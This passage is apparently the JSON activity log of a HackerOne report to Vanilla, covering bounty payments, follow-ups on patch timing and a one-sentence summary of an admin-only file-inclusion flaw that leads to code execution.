validation.","markdown_message":"\u003cp\u003eAdding bonus for demonstrating additional vectors opened by our lack of validation.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-24T12:44:39.988Z","updated_at":"2018-09-24T12:44:39.988Z","actor":{"url":"/vanilla","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vanilla"}},"bounty_amount":"300.0","bounty_currency":"usd","bonus_amount":"600.0","genius_execution_id":null,"team_handle":"vanilla","collaborator":{"username":"mr_me","url":"/mr_me"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3379418,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks guys !","markdown_message":"\u003cp\u003eThanks guys !\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-24T13:11:32.474Z","updated_at":"2018-09-24T13:11:32.474Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3406138,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @linc, hows the patch looking for this? Is it rolled out?","markdown_message":"\u003cp\u003eHey \u003ca href=\"/linc\"\u003e@linc\u003c/a\u003e, hows the patch looking for this? Is it rolled out?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-29T14:37:24.268Z","updated_at":"2018-09-29T14:37:24.268Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3406232,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We've rolled out the patch to cloud, but not open source yet (in an official release - the patch is of course open source). I'm preparing a batch of High-severity issues that I plan to send out at once to avoid upgrade fatigue among our users.","markdown_message":"\u003cp\u003eWe\u0026#39;ve rolled out the patch to cloud, but not open source yet (in an official release - the patch is of course open source). I\u0026#39;m preparing a batch of High-severity issues that I plan to send out at once to avoid upgrade fatigue among our users.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-29T15:14:51.773Z","updated_at":"2018-09-29T15:14:51.773Z","actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3449717,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey, is this patched yet on github?","markdown_message":"\u003cp\u003eHey, is this patched yet on github?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-08T16:56:01.888Z","updated_at":"2018-10-08T16:56:01.888Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3523087,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, it's been over a month since I reported this, is this patched yet?","markdown_message":"\u003cp\u003eHi, it\u0026#39;s been over a month since I reported this, is this patched yet?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-24T01:06:07.631Z","updated_at":"2018-10-24T01:06:07.631Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3546712,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This report is not yet publicly patched, no. We had a serious spike it legitimate reports during the month of September and are working to catch up on High-severity issues now and coordinate a release.","markdown_message":"\u003cp\u003eThis report is not yet publicly patched, no. We had a serious spike it legitimate reports during the month of September and are working to catch up on High-severity issues now and coordinate a release.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-28T22:19:36.693Z","updated_at":"2018-10-28T22:19:36.693Z","actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4124285,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-11T00:39:56.745Z","updated_at":"2019-02-11T00:39:56.745Z","actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"mr_me","url":"/mr_me"},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4127842,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-11T12:22:13.687Z","updated_at":"2019-02-11T12:22:13.687Z","first_to_agree":true,"actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4316145,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-13T12:22:14.882Z","updated_at":"2019-03-13T12:22:14.882Z","actor":{"url":"/vanilla","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vanilla"}},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":10603,"category":"researcher","content":"An authenticated admin user can trigger a directory traversal to a `require` call leading to local file inclusion which can allow an attacker to gain remote code execution.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eAn authenticated admin user can trigger a directory traversal to a \u003ccode\u003erequire\u003c/code\u003e call leading to local file inclusion which can allow an attacker to gain remote code execution.\u003c/p\u003e\n"}]}